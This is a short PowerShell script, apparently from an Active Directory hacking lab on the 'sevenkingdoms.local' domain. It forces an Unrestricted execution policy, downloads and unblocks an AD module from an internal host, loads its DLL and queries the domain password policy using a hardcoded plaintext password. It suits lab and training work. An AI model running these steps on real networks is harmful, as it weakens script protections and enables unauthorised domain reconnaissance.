Set-ExecutionPolicy -Scope CurrentUser Unrestricted -Force

Invoke-WebRequest -Uri http://192.168.56.5:8001/ADModule-master.zip -OutFile C:\Users\robb.stark\ADMod\adzip.zip

Expand-Archive -Path C:\Users\robb.stark\ADMod\adzip.zip -DestinationPath C:\Users\robb.stark\ADMod

$directoryADMod = "C:\Users\robb.stark\ADMod\ADModule-master"

Get-ChildItem -Path $directoryADMod -Recurse | Unblock-File

Import-Module C:\Users\robb.stark\ADMod\ADModule-master\Microsoft.ActiveDirectory.Management.dll -Force

Import-Module C:\Users\robb.stark\ADMod\ADModule-master\ActiveDirectory\ActiveDirectory.psd1 -Force

Get-ADDefaultDomainPasswordPolicy

$username= "sevenkingdoms.local\robert.baratheon"
$password= ConvertTo-SecureString "iamthekingoftheworld" -AsPlainText -Force

$credential = New-Object System.Management.Automation.PSCredential($username,$password)

Get-ADDefaultDomainPasswordPolicy -Credential $credential
